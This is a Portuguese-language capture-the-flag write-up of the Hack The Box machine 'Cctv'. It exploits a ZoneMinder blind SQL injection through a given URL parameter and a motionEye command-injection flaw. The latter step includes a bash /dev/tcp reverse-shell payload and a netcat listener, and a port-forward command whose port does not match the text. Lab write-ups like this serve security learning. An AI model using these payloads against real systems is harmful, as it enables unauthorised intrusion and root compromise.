# Máquina: Cctv(Hack The Box)

## Enumeração
Comecei a enumeração fazendo um scan nas portas da máquina alvo para descobrir portas abertas e serviços em execução:
 
<img width="687" height="70" alt="nmap" src="https://github.com/user-attachments/assets/cf71ecba-a9c5-4cc3-8bbd-ceddca5ced16" />

Descobri o serviço ssh e http em execução, então, fui enumerar a aplicação web.

Na aplicação, encontrei uma página de login no serviço zoneminder:
<img width="721" height="438" alt="login" src="https://github.com/user-attachments/assets/05f7db1f-6cff-48ee-8d16-eb1d71720653" />

Que nos permitiu acessar o dashboard com as credenciais admin:admin.

Já logado, descobri que o zoneminder está executando na versão: 1.37.63, versão vulnerável a um boolean sql injection CVE-2024-51482.  

## Exploração
A vulnerabilidade existe no endpoint web/ajax/event.php na função removetag, onde o parâmetro "tid" é concatenado diretamente na query sql sem satinização e parametrização apropriada.

Podemos interagir com o endpoint via:
```
http://target/zm/index.php?view=request&request=event&action=removetag&tid=[INJECTION_POINT]
```


Utilizei sqlmap para explorar essa vulnerabilidade, onde ele automatizaria um blind sql injection que descobriria nome de banco de dados, tabelas, e informações nas tabelas através de reações do banco de dados de acordo com as injeções.

Com o sqlmap, descobrimos hashes dos usuários "mark" e "superadmin":
<img width="646" height="101" alt="sqlmap" src="https://github.com/user-attachments/assets/71bbc96f-6426-43dc-aa67-d5cde3489c99" />

Usando o John the ripper, consegui crackear o hash da senha do usuário "mark" e com as credenciais, acessei a máquina alvo via ssh:
<img width="656" height="607" alt="ssh" src="https://github.com/user-attachments/assets/52f533d1-f43d-49df-81f2-786ab2e129df" />


## Escalação de privilégios

Utilizando o comando "ss -tlnp", descobri que o "motioneye" está sendo executado localmente na porta 8765, então para acessar esse serviço, fiz um portforwarding para também a porta 8765 da minha máquina.
```bash
ssh -L 8655:127.0.0.1:8655 mark@ip
```

Para logar no serviço achei as credenciais no arquivo "/etc/motioneye/motion.conf":
<img width="510" height="258" alt="motioneye" src="https://github.com/user-attachments/assets/46306088-c9ce-48ce-8ea2-73048d028933" />

O motioneye, tem uma vulnerabilidade RCE, ele permite strings arbitrárias no campo image_file_name que são escritos diretamente em  /etc/motioneye/camera-*.conf e são interpretados como comandos shell (CVE-2025-60787).

Primeiro, temos que desativar a validação no front-end que impede o uso de caracteres especiais no campo image file name:

<img width="452" height="199" alt="javascript" src="https://github.com/user-attachments/assets/42cf6727-a6bf-4638-944d-cf7b11aaaeb0" />

Agora podemos injetar nosso reverse shell:
```bash
$(python3 -c 'import os;os.system("bash -c \"bash -i >& /dev/tcp/<IP>/4444 0>&1\"")').%Y-%m-%d-%H-%M-%S
```
<img width="1242" height="823" alt="reverse shell" src="https://github.com/user-attachments/assets/1dfe25d7-4caa-45c1-99c2-6a3dc7605481" />


Abri um listener na porta 4444:
```bash
nc -lvnp 4444
```

Quando tiramos um snapshot, o reverse shell é executado e conseguimos acesso root ao sistema, conseguindo acessar a user flag e a root flag:

<img width="316" height="51" alt="user" src="https://github.com/user-attachments/assets/818e8ef8-1697-470a-8494-7c3ad2ff6a38" />

<img width="386" height="46" alt="root" src="https://github.com/user-attachments/assets/226404c4-be4f-443c-9e52-fa34c70bbcb1" />

Finalizando essa máquina.


